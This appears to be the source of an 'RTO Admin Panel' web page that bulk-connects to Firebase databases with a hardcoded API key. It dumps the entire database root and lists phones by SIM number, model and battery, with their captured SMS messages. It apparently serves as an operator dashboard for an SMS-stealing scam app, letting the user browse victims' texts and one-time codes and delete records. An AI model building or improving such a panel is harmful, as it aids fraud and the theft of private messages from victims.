<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>RTO Admin Panel</title>
<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#F5F7FB; color:#1E293B; min-height:100vh; }

.connect-screen { position:fixed; inset:0; background:linear-gradient(135deg,#F5F7FB,#EFF6FF); display:flex; align-items:center; justify-content:center; z-index:10000; padding:20px; overflow-y:auto; }
.connect-box { background:#FFFFFF; border:1px solid #E2E8F0; border-radius:20px; padding:28px; max-width:520px; width:100%; box-shadow:0 20px 60px rgba(15,23,42,0.12); margin:auto; }
.connect-box h1 { color:#1E40AF; font-size:20px; margin-bottom:6px; font-weight:800; text-align:center; }
.connect-box .sub { color:#64748B; font-size:12px; margin-bottom:22px; text-align:center; }

.saved-section { margin-bottom:20px; }
.saved-title { color:#64748B; font-size:10px; text-transform:uppercase; letter-spacing:0.1em; font-weight:800; margin-bottom:10px; display:flex; align-items:center; gap:10px; }
.saved-title::before, .saved-title::after { content:''; flex:1; height:1px; background:#E2E8F0; }
.saved-list { display:flex; flex-direction:column; gap:8px; max-height:200px; overflow-y:auto; }
.saved-item { background:#F8FAFC; border:1px solid #E2E8F0; border-radius:12px; padding:12px 14px; display:flex; align-items:center; gap:12px; cursor:pointer; }
.saved-item:hover { background:#EFF6FF; border-color:#BFDBFE; }
.saved-icon { width:38px; height:38px; border-radius:11px; background:linear-gradient(135deg,#3B82F6,#2563EB); display:flex; align-items:center; justify-content:center; font-size:16px; flex-shrink:0; }
.saved-info { flex:1; min-width:0; }
.saved-name { color:#0F172A; font-size:12px; font-weight:700; }
.saved-url { color:#94A3B8; font-size:9px; font-family:monospace; margin-top:3px; }
.saved-del { background:#FEF2F2; border:none; color:#DC2626; width:28px; height:28px; border-radius:8px; cursor:pointer; font-size:12px; font-weight:700; }

.bulk-card { background:linear-gradient(135deg,#FEF3C7,#FFFBEB); border:1px solid #FCD34D; border-radius:14px; padding:16px; margin-bottom:16px; }
.bulk-card h3 { color:#92400E; font-size:13px; margin-bottom:8px; font-weight:700; }
.bulk-card textarea { width:100%; min-height:80px; padding:12px; background:#FFFFFF; border:1px solid #FCD34D; border-radius:10px; color:#1E293B; font-size:11px; font-family:monospace; resize:vertical; }
.btn-bulk { width:100%; padding:14px; background:linear-gradient(135deg,#F59E0B,#D97706); color:white; border:none; border-radius:10px; font-size:13px; font-weight:800; cursor:pointer; margin-top:12px; }

.form-sep { display:flex; align-items:center; gap:12px; margin:18px 0 16px; color:#94A3B8; font-size:9px; text-transform:uppercase; letter-spacing:0.12em; font-weight:800; }
.form-sep::before, .form-sep::after { content:''; flex:1; height:1px; background:#E2E8F0; }

.fl { display:block; color:#64748B; font-size:10px; margin-bottom:6px; text-transform:uppercase; font-weight:700; }
.fi { width:100%; padding:12px 14px; background:#F8FAFC; border:1px solid #E2E8F0; border-radius:10px; color:#1E293B; font-size:13px; margin-bottom:12px; }
.btn-connect { width:100%; padding:14px; background:linear-gradient(135deg,#2563EB,#1D4ED8); color:white; border:none; border-radius:11px; font-size:13px; font-weight:800; cursor:pointer; }
.connect-err { color:#DC2626; font-size:11px; margin-top:10px; min-height:16px; font-weight:700; text-align:center; }

.topbar { background:#FFFFFF; padding:14px 18px; display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #E2E8F0; position:sticky; top:0; z-index:100; }
.topbar h1 { color:#1E40AF; font-size:15px; font-weight:700; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; max-width:45%; }
.topbar-right { display:flex; align-items:center; gap:8px; }
.status { display:flex; align-items:center; gap:6px; font-size:10px; color:#059669; padding:5px 10px; background:#ECFDF5; border-radius:20px; font-weight:700; }
.dot { width:6px; height:6px; border-radius:50%; background:#10B981; }
.btn-new { background:#EFF6FF; color:#2563EB; border:1px solid #BFDBFE; padding:7px 13px; border-radius:9px; font-size:11px; font-weight:700; cursor:pointer; }
.btn-logout { background:#FEF2F2; color:#DC2626; border:1px solid #FECACA; padding:7px 13px; border-radius:9px; font-size:11px; font-weight:700; cursor:pointer; }

.stats { display:grid; grid-template-columns:repeat(5,1fr); gap:1px; background:#E2E8F0; }
.stat { background:#FFFFFF; padding:12px 6px; text-align:center; }
.stat .n { font-size:20px; font-weight:800; color:#2563EB; }
.stat .l { font-size:8px; color:#64748B; text-transform:uppercase; margin-top:3px; font-weight:700; }
.stat.g .n { color:#059669; }
.stat.r .n { color:#DC2626; }
.stat.y .n { color:#D97706; }

.search-box { margin:14px 18px; width:calc(100% - 36px); padding:12px 16px; background:#FFFFFF; border:1px solid #E2E8F0; border-radius:12px; font-size:13px; }

.device-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(340px,1fr)); gap:12px; padding:0 18px 40px; }
.device-card { background:#FFFFFF; border:1px solid #E2E8F0; border-radius:14px; padding:14px; cursor:pointer; }
.device-card:hover { transform:translateY(-2px); box-shadow:0 8px 20px rgba(37,99,235,0.12); border-color:#BFDBFE; }
.device-header { display:flex; align-items:center; gap:11px; margin-bottom:12px; }
.wifi-icon { width:40px; height:40px; border-radius:12px; background:linear-gradient(135deg,#3B82F6,#2563EB); display:flex; align-items:center; justify-content:center; font-size:17px; flex-shrink:0; }
.device-info { flex:1; min-width:0; }
.device-name { color:#0F172A; font-size:13px; font-weight:700; }
.device-id { color:#94A3B8; font-size:9px; font-family:monospace; }
.device-grid-2 { display:grid; grid-template-columns:1fr 1fr; gap:8px; padding-top:12px; border-top:1px solid #F1F5F9; }
.device-grid-2 .k { color:#94A3B8; font-size:9px; text-transform:uppercase; font-weight:700; }
.device-grid-2 .v { color:#334155; font-size:12px; font-weight:600; margin-top:3px; word-break:break-word; }

.drawer-overlay { position:fixed; inset:0; background:rgba(15,23,42,0.5); z-index:998; opacity:0; pointer-events:none; transition:opacity 0.25s; }
.drawer-overlay.active { opacity:1; pointer-events:auto; }
.drawer { position:fixed; top:0; right:0; width:100%; max-width:640px; height:100vh; background:#F8FAFC; z-index:999; transform:translateX(100%); transition:transform 0.3s; display:flex; flex-direction:column; }
.drawer.active { transform:translateX(0); }
.drawer-head { padding:14px 16px; border-bottom:1px solid #E2E8F0; display:flex; justify-content:space-between; align-items:center; background:#FFFFFF; }
.drawer-head h2 { color:#1E40AF; font-size:14px; font-weight:700; flex:1; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
.ibtn { background:#F1F5F9; border:none; color:#475569; width:32px; height:32px; border-radius:9px; cursor:pointer; font-size:13px; }
.ibtn.danger { background:#FEF2F2; color:#DC2626; }

.tabs { display:flex; padding:0 12px; background:#FFFFFF; border-bottom:1px solid #E2E8F0; overflow-x:auto; }
.tab { padding:12px 14px; background:transparent; border:none; color:#94A3B8; font-size:11px; font-weight:700; cursor:pointer; white-space:nowrap; border-bottom:2px solid transparent; }
.tab.active { color:#2563EB; border-bottom-color:#2563EB; }
.tab .cnt { background:#F1F5F9; color:#64748B; padding:2px 7px; border-radius:10px; font-size:9px; margin-left:5px; font-weight:700; }

.drawer-body { padding:14px; overflow-y:auto; flex:1; background:#F8FAFC; }

.msg { background:#FFFFFF; border-left:3px solid #3B82F6; border-radius:8px; padding:12px 14px; margin-bottom:8px; }
.msg-head { display:flex; justify-content:space-between; margin-bottom:5px; }
.msg-from { color:#1E40AF; font-size:11px; font-weight:700; }
.msg-tag { color:#94A3B8; font-size:9px; }
.msg-body { color:#1E293B; font-size:12px; line-height:1.55; word-break:break-word; white-space:pre-wrap; }
.msg-date { color:#94A3B8; font-size:9px; margin-top:5px; }

.dir { display:flex; justify-content:space-between; padding:11px 0; border-bottom:1px solid #F1F5F9; font-size:12px; }
.dir .k { color:#64748B; font-weight:600; }
.dir .v { color:#1E293B; font-weight:600; text-align:right; max-width:60%; word-break:break-word; }

.card { background:#FFFFFF; border:1px solid #E2E8F0; border-radius:14px; padding:16px; margin-bottom:12px; }
.card h3 { color:#1E40AF; font-size:13px; margin-bottom:8px; font-weight:700; }

.loading { text-align:center; padding:40px; color:#94A3B8; font-weight:600; }
.empty { text-align:center; padding:40px 20px; color:#94A3B8; font-size:12px; font-weight:600; }

.raw-json { background:#0F172A; color:#94A3B8; font-family:monospace; font-size:10px; padding:12px; border-radius:8px; overflow-x:auto; white-space:pre-wrap; word-break:break-word; max-height:400px; overflow-y:auto; }
</style>
</head>
<body>

<div class="connect-screen" id="connectScreen">
  <div class="connect-box">
    <h1>🔗 Firebase Connect</h1>
    <div class="sub">Enter Firebase URL and Key</div>
    <div class="saved-section" id="savedSection" style="display:none;">
      <div class="saved-title">Saved</div>
      <div class="saved-list" id="savedList"></div>
    </div>
    <div class="bulk-card">
      <h3>⚡ Bulk Connect</h3>
      <textarea id="bulkInput" placeholder="Paste Firebase URLs here..."></textarea>
      <button class="btn-bulk" id="btnBulkConnect">⚡ Connect All</button>
    </div>
    <div class="form-sep">Or Manual</div>
    <label class="fl">Firebase Database URL</label>
    <input type="text" class="fi" id="newUrl" placeholder="https://your-project.firebaseio.com">
    <label class="fl">API Key (optional)</label>
    <input type="text" class="fi" id="newKey" placeholder="AIzaSy...">
    <button class="btn-connect" id="btnConnect">⚡ Connect</button>
    <div class="connect-err" id="connectErr"></div>
  </div>
</div>

<div id="mainApp" style="display:none;">
  <div class="topbar">
    <h1 id="topTitle">🚔 ADMIN</h1>
    <div class="topbar-right">
      <div class="status"><div class="dot"></div><span>Live</span></div>
      <button class="btn-new" id="btnNewConn">NEW</button>
      <button class="btn-logout" id="logoutBtn">LOGOUT</button>
    </div>
  </div>
  <div class="stats">
    <div class="stat"><div class="n" id="sTotal">0</div><div class="l">Total</div></div>
    <div class="stat g"><div class="n" id="sOnline">0</div><div class="l">Online</div></div>
    <div class="stat r"><div class="n" id="sOffline">0</div><div class="l">Offline</div></div>
    <div class="stat"><div class="n" id="sSms">0</div><div class="l">SMS</div></div>
    <div class="stat y"><div class="n" id="sKeys">0</div><div class="l">Nodes</div></div>
  </div>
  <input type="text" class="search-box" id="searchBox" placeholder="🔍 Search...">
  <div class="device-grid" id="deviceGrid"><div class="loading">Loading...</div></div>
</div>

<div class="drawer-overlay" id="dOverlay"></div>
<div class="drawer" id="drawer">
  <div class="drawer-head">
    <h2 id="dTitle">Device</h2>
    <div style="display:flex;gap:6px;">
      <button class="ibtn danger" id="btnDel">🗑</button>
      <button class="ibtn" id="btnClose">✕</button>
    </div>
  </div>
  <div class="tabs">
    <button class="tab active" data-t="info">Info</button>
    <button class="tab" data-t="raw">Raw JSON</button>
    <button class="tab" data-t="msgs">Messages <span class="cnt" id="cMsgs">0</span></button>
  </div>
  <div class="drawer-body" id="dBody"></div>
</div>

<script>
var DEFAULT_CONFIG = { apiKey: "AIzaSyAUdypsKO90R7-qqvR0W7oM27HgtTXKVL8" };
var db = null, currentApp = null, currentAccount = null;
var devs = {}, devPaths = {}, curId = null, curTab = 'info';
var liked = JSON.parse(localStorage.getItem('liked') || '[]');
var scanListener = null;
var ROOT_DATA = {};

function normalizeFirebaseUrl(url) {
  if (!url) return url;
  url = url.trim().replace(/\/+$/, '');
  if (url.indexOf('http') !== 0) url = 'https://' + url;
  return url;
}
function extractProjectId(url) {
  try { return url.replace('https://','').replace('http://','').split('.')[0]; } catch(e) { return 'unknown'; }
}

function tryConnect(config) {
  return new Promise(function(resolve) {
    try {
      if (currentApp) { try { currentApp.delete(); } catch(e) {} }
      var appName = 'app_' + Date.now();
      currentApp = firebase.initializeApp(config, appName);
      db = currentApp.database();
      var done = false;
      var timer = setTimeout(function() { if (!done) { done = true; resolve(); } }, 4000);
      db.ref('/').once('value').then(function() { if (!done) { done = true; clearTimeout(timer); resolve(); } }).catch(function() { if (!done) { done = true; clearTimeout(timer); resolve(); } });
    } catch(e) { resolve(); }
  });
}

// ============ MAIN LOGIC: Har node ko alag se process karo ============
function buildDevicesFromRoot(root) {
  if (!root || typeof root !== 'object') return {};
  var devices = {};
  var nodesFound = [];

  // Har top-level node ko scan karo
  Object.keys(root).forEach(function(nodeName) {
    var node = root[nodeName];
    if (!node || typeof node !== 'object' || Array.isArray(node)) return;
    nodesFound.push(nodeName);

    // Har child key ko scan karo
    Object.keys(node).forEach(function(childKey) {
      var child = node[childKey];
      if (!child || typeof child !== 'object' || Array.isArray(child)) {
        // Simple value node - skip
        return;
      }

      // Device ID nikalo - kai possible fields
      var did = child.user_id || child.device_id || child.deviceId || 
                child.uid || child.id || child.userId ||
                child.phone || child.phone_number ||
                childKey;

      // Agar child mein koi bhi identifier field hai toh isko device maano
      var hasId = child.user_id || child.device_id || child.deviceId || 
                  child.uid || child.userId || child.phone || 
                  child.phone_number || child.user_serial || 
                  child.d_name || child.sender || child.sim_number;

      if (!hasId && Object.keys(child).length < 3) return; // Skip empty/small nodes

      did = String(did);

      if (!devices[did]) {
        devices[did] = { data: {}, sources: [], raw: {} };
      }

      // Source track karo
      devices[did].sources.push(nodeName + '/' + childKey);
      devices[did].raw[nodeName + '/' + childKey] = child;

      // Data merge karo
      deepMergeInto(devices[did].data, child);
    });
  });

  return { devices: devices, nodes: nodesFound };
}

function deepMergeInto(target, source) {
  if (!source || typeof source !== 'object') return;
  Object.keys(source).forEach(function(k) {
    var sv = source[k];
    if (sv === undefined || sv === null) return;
    var tv = target[k];
    if (tv === undefined) {
      if (sv && typeof sv === 'object') {
        if (Array.isArray(sv)) target[k] = sv.slice();
        else { target[k] = {}; deepMergeInto(target[k], sv); }
      } else target[k] = sv;
    } else if (sv && typeof sv === 'object' && !Array.isArray(sv) && tv && typeof tv === 'object' && !Array.isArray(tv)) {
      deepMergeInto(tv, sv);
    } else if (Array.isArray(sv) && Array.isArray(tv)) {
      sv.forEach(function(item) { if (!tv.some(function(x) { return JSON.stringify(x) === JSON.stringify(item); })) tv.push(item); });
    }
  });
}

// ============ CONNECT ============
function connectToAccount(acc) {
  if (!acc || !acc.url) return;
  var url = normalizeFirebaseUrl(acc.url);
  var config = { apiKey: acc.apiKey || DEFAULT_CONFIG.apiKey, databaseURL: url, projectId: extractProjectId(url) };
  currentAccount = { name: acc.name || extractProjectId(url), url: url, apiKey: config.apiKey };
  var e = document.getElementById('connectErr');
  if (e) { e.style.color = '#2563EB'; e.textContent = '⏳ Connecting...'; }
  tryConnect(config).then(function() {
    try { localStorage.setItem('rto_last_account', JSON.stringify(currentAccount)); } catch(err) {}
    document.getElementById('connectScreen').style.display = 'none';
    document.getElementById('mainApp').style.display = 'block';
    document.getElementById('topTitle').textContent = '🚔 ' + currentAccount.name;
    startApp();
  });
}

function startApp() {
  if (scanListener) { try { scanListener.off(); } catch(e) {} }
  devs = {}; devPaths = {};
  document.getElementById('deviceGrid').innerHTML = '<div class="loading">Loading full Firebase...</div>';

  db.ref('/').once('value').then(function(snap) {
    ROOT_DATA = snap.val() || {};
    var result = buildDevicesFromRoot(ROOT_DATA);
    devs = {};
    Object.keys(result.devices).forEach(function(id) {
      devs[id] = result.devices[id].data;
      devPaths[id] = { sources: result.devices[id].sources, raw: result.devices[id].raw };
    });
    console.log('Nodes found:', result.nodes);
    console.log('Devices found:', Object.keys(devs).length);
    updStats();
    renderDevs();

    // Live listener
    scanListener = db.ref('/');
    scanListener.on('value', function(snapshot) {
      ROOT_DATA = snapshot.val() || {};
      var r2 = buildDevicesFromRoot(ROOT_DATA);
      var changed = false;
      Object.keys(r2.devices).forEach(function(id) {
        if (!devs[id]) { devs[id] = r2.devices[id].data; devPaths[id] = { sources: r2.devices[id].sources, raw: r2.devices[id].raw }; changed = true; }
        else {
          var old = JSON.stringify(devs[id]);
          deepMergeInto(devs[id], r2.devices[id].data);
          if (JSON.stringify(devs[id]) !== old) changed = true;
        }
      });
      if (changed) { updStats(); renderDevs(); if (curId && devs[curId]) renderTab(); }
    });
  }).catch(function(err) {
    document.getElementById('deviceGrid').innerHTML = '<div class="empty">Error: ' + esc(err.message) + '</div>';
  });
}

// ============ RENDER ============
function renderDevs() {
  var g = document.getElementById('deviceGrid');
  var q = (document.getElementById('searchBox').value || '').toLowerCase();
  var ids = Object.keys(devs).filter(function(id) {
    var s = (id + ' ' + JSON.stringify(devs[id])).toLowerCase();
    return s.indexOf(q) !== -1;
  });
  if (ids.length === 0) { g.innerHTML = '<div class="empty">No devices found</div>'; return; }
  g.innerHTML = ids.map(function(id) {
    var d = devs[id];
    var name = d.d_name || d.device_name || d.device_model || d.name || d.user_id || id;
    var android = d.android_version || d.android || d.os_version || '?';
    var battery = d.battery || d.battery_level || '?';
    var number = d.sim_number || d.phone || d.phone_number || d.mobile || d.number || 'N/A';
    var model = d.device_model || d.model || d.device || '?';
    var sources = devPaths[id] ? devPaths[id].sources.length : 0;
    return '<div class="device-card" data-id="' + esc(id) + '"><div class="device-header"><div class="wifi-icon">📱</div><div class="device-info"><div class="device-name">' + esc(name) + '</div><div class="device-id">' + esc(id) + ' · ' + sources + ' node(s)</div></div></div><div class="device-grid-2"><div><div class="k">Model</div><div class="v">' + esc(model) + '</div></div><div><div class="k">Battery</div><div class="v">' + esc(battery) + '</div></div><div><div class="k">Android</div><div class="v">' + esc(android) + '</div></div><div><div class="k">Number</div><div class="v">' + esc(number) + '</div></div></div></div>';
  }).join('');
  g.querySelectorAll('.device-card').forEach(function(c) {
    c.addEventListener('click', function() { openDev(this.getAttribute('data-id')); });
  });
}

function openDev(id) {
  curId = id;
  var d = devs[id];
  document.getElementById('dTitle').textContent = '📱 ' + (d.d_name || d.device_name || d.device_model || id);
  document.getElementById('drawer').classList.add('active');
  document.getElementById('dOverlay').classList.add('active');
  switchTab('info');
}
function closeDev() {
  document.getElementById('drawer').classList.remove('active');
  document.getElementById('dOverlay').classList.remove('active');
  curId = null;
}
function switchTab(t) {
  curTab = t;
  document.querySelectorAll('.tab').forEach(function(x) { x.classList.toggle('active', x.getAttribute('data-t') === t); });
  renderTab();
}

function renderTab() {
  var b = document.getElementById('dBody');
  var d = devs[curId];
  var info = devPaths[curId] || {};
  if (!d) { b.innerHTML = '<div class="empty">Not found</div>'; return; }

  if (curTab === 'info') {
    // Saare flat fields dikhao
    var flat = flattenObject(d);
    var html = '';
    
    // Sources
    if (info.sources && info.sources.length > 0) {
      html += '<div class="card"><h3>📍 Data Sources</h3>';
      info.sources.forEach(function(s) { html += '<div class="dir"><span class="k">Node</span><span class="v">' + esc(s) + '</span></div>'; });
      html += '</div>';
    }
    
    html += '<div class="card"><h3>📋 All Fields (' + flat.length + ')</h3>';
    flat.forEach(function(f) {
      html += '<div class="dir"><span class="k">' + esc(f.key) + '</span><span class="v">' + esc(f.value) + '</span></div>';
    });
    html += '</div>';
    b.innerHTML = html;
  } else if (curTab === 'raw') {
    var raw = info.raw || {};
    var html = '<div class="card"><h3>📄 Raw JSON Data</h3>';
    Object.keys(raw).forEach(function(src) {
      html += '<div style="margin-bottom:12px;"><div style="color:#1E40AF;font-size:11px;font-weight:700;margin-bottom:6px;">📂 ' + esc(src) + '</div>';
      html += '<div class="raw-json">' + esc(JSON.stringify(raw[src], null, 2)) + '</div></div>';
    });
    html += '</div>';
    b.innerHTML = html;
  } else if (curTab === 'msgs') {
    var msgs = [];
    function findMsgs(obj, path) {
      if (!obj || typeof obj !== 'object') return;
      Object.keys(obj).forEach(function(k) {
        var v = obj[k];
        if (v && typeof v === 'object') {
          if (v.body || v.message || v.text || v.sender || v.msg) {
            msgs.push({ key: path + '/' + k, data: v });
          } else {
            findMsgs(v, path + '/' + k);
          }
        }
      });
    }
    findMsgs(d, '');
    document.getElementById('cMsgs').textContent = msgs.length;
    if (msgs.length === 0) { b.innerHTML = '<div class="empty">No messages</div>'; return; }
    b.innerHTML = msgs.map(function(m) {
      var v = m.data;
      return '<div class="msg"><div class="msg-head"><span class="msg-from">' + esc(v.sender || v.from || 'Unknown') + '</span><span class="msg-tag">' + esc(m.key) + '</span></div><div class="msg-body">' + esc(v.body || v.message || v.text || '') + '</div><div class="msg-date">' + esc(v.date || v.timestamp || '') + '</div></div>';
    }).join('');
  }
}

function flattenObject(obj, prefix) {
  var result = [];
  prefix = prefix || '';
  if (!obj || typeof obj !== 'object') return result;
  Object.keys(obj).forEach(function(k) {
    var v = obj[k];
    var key = prefix ? prefix + '.' + k : k;
    if (v === null || v === undefined) return;
    if (typeof v === 'object' && !Array.isArray(v)) {
      result = result.concat(flattenObject(v, key));
    } else if (Array.isArray(v)) {
      result.push({ key: key, value: JSON.stringify(v) });
    } else {
      result.push({ key: key, value: String(v) });
    }
  });
  return result;
}

function updStats() {
  var ids = Object.keys(devs);
  document.getElementById('sTotal').textContent = ids.length;
  document.getElementById('sOnline').textContent = '0';
  document.getElementById('sOffline').textContent = ids.length;
  var sms = 0;
  ids.forEach(function(id) {
    function countMsgs(o) {
      if (!o || typeof o !== 'object') return;
      Object.keys(o).forEach(function(k) {
        var v = o[k];
        if (v && typeof v === 'object') {
          if (v.body || v.message || v.sender) sms++;
          else countMsgs(v);
        }
      });
    }
    countMsgs(devs[id]);
  });
  document.getElementById('sSms').textContent = sms;
  document.getElementById('sKeys').textContent = Object.keys(ROOT_DATA).length;
}

function esc(t) { if (t === undefined || t === null) return ''; var d = document.createElement('div'); d.textContent = String(t); return d.innerHTML; }

function getSavedAccounts() { try { return JSON.parse(localStorage.getItem('rto_accounts') || '[]'); } catch(e) { return []; } }
function saveAccounts(l) { localStorage.setItem('rto_accounts', JSON.stringify(l)); }

function saveNewAcc() {
  var u = document.getElementById('newUrl').value.trim();
  var k = document.getElementById('newKey').value.trim();
  var e = document.getElementById('connectErr');
  if (!u) { e.textContent = '❌ URL required'; return; }
  u = normalizeFirebaseUrl(u);
  if (!k) k = DEFAULT_CONFIG.apiKey;
  var l = getSavedAccounts();
  var idx = l.findIndex(function(a) { return a.url === u; });
  var acc = { name: extractProjectId(u), url: u, apiKey: k };
  if (idx !== -1) l[idx] = acc; else l.push(acc);
  saveAccounts(l);
  e.style.color = '#059669'; e.textContent = '✅ Connecting...';
  setTimeout(function() { connectToAccount(acc); }, 300);
}

function bulkConnect() {
  var t = document.getElementById('bulkInput').value.trim();
  var urls = t.match(/https?:\/\/[a-zA-Z0-9_.-]+\.(?:firebaseio\.com|firebasedatabase\.app)/g) || [];
  if (urls.length === 0) { document.getElementById('connectErr').textContent = '❌ No URL found'; return; }
  var l = getSavedAccounts();
  urls.forEach(function(u) {
    if (!l.find(function(x) { return x.url === u; })) {
      l.push({ name: extractProjectId(u), url: u, apiKey: DEFAULT_CONFIG.apiKey });
    }
  });
  saveAccounts(l);
  connectToAccount({ name: extractProjectId(urls[0]), url: urls[0], apiKey: DEFAULT_CONFIG.apiKey });
}

function renderSavedAccounts() {
  var list = getSavedAccounts();
  var section = document.getElementById('savedSection');
  var el = document.getElementById('savedList');
  if (list.length === 0) { section.style.display = 'none'; return; }
  section.style.display = 'block';
  el.innerHTML = list.map(function(a, i) {
    return '<div class="saved-item" data-acc="' + i + '"><div class="saved-icon">🔥</div><div class="saved-info"><div class="saved-name">' + esc(a.name) + '</div><div class="saved-url">' + esc(a.url) + '</div></div><button class="saved-del" data-del="' + i + '">✕</button></div>';
  }).join('');
  el.querySelectorAll('.saved-item').forEach(function(it) {
    it.addEventListener('click', function(e) {
      if (e.target.hasAttribute('data-del')) return;
      connectToAccount(list[parseInt(this.getAttribute('data-acc'))]);
    });
  });
  el.querySelectorAll('[data-del]').forEach(function(b) {
    b.addEventListener('click', function(e) {
      e.stopPropagation();
      var l2 = getSavedAccounts(); l2.splice(parseInt(this.getAttribute('data-del')), 1);
      saveAccounts(l2); renderSavedAccounts();
    });
  });
}

function doLogout() {
  if (currentApp) { try { currentApp.delete(); } catch(e) {} currentApp = null; }
  if (scanListener) { try { scanListener.off(); } catch(e) {} }
  db = null; devs = {}; devPaths = {}; curId = null; ROOT_DATA = {};
  document.getElementById('mainApp').style.display = 'none';
  document.getElementById('connectScreen').style.display = 'flex';
  renderSavedAccounts();
}

// Events
document.getElementById('btnConnect').addEventListener('click', saveNewAcc);
document.getElementById('btnBulkConnect').addEventListener('click', bulkConnect);
document.getElementById('logoutBtn').addEventListener('click', doLogout);
document.getElementById('btnNewConn').addEventListener('click', doLogout);
document.getElementById('btnClose').addEventListener('click', closeDev);
document.getElementById('dOverlay').addEventListener('click', closeDev);
document.getElementById('searchBox').addEventListener('input', renderDevs);
document.getElementById('btnDel').addEventListener('click', function() {
  if (!confirm('Delete this device?')) return;
  var sources = devPaths[curId].sources || [];
  sources.forEach(function(s) { db.ref(s).remove(); });
  delete devs[curId]; delete devPaths[curId];
  closeDev(); renderDevs(); updStats();
});
document.querySelectorAll('.tab').forEach(function(x) {
  x.addEventListener('click', function() { switchTab(this.getAttribute('data-t')); });
});

renderSavedAccounts();
</script>
</body>
